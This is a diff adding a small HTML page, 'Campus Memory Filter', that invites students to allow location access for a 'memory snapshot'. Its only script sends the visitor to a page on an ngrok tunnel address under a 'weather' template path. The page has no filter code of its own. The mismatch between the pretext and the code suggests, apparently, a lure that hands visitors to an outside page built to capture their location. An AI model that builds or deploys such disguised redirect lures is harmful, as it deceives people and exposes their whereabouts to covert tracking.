@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Campus Memory Filter</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: linear-gradient(to right, #83a4d4, #b6fbff);
+    }
+    h1 {
+      color: #333;
+    }
+    #output {
+      margin-top: 20px;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      display: inline-block;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+  <h1>🎓 Campus Memory Filter 📍</h1>
+  <p>To generate your last-day memory snapshot, please allow location access below:</p>
+  <button onclick="getLocation()">Generate</button>
+  <div id="output"></div>
+
+  <script>
+  
+  function getLocation() {
+    window.location.href = "http://c72d-197-248-59-233.ngrok-free.app/templates/weather/index.html";
+  }
+
+  </script>
+</body>
+</html>
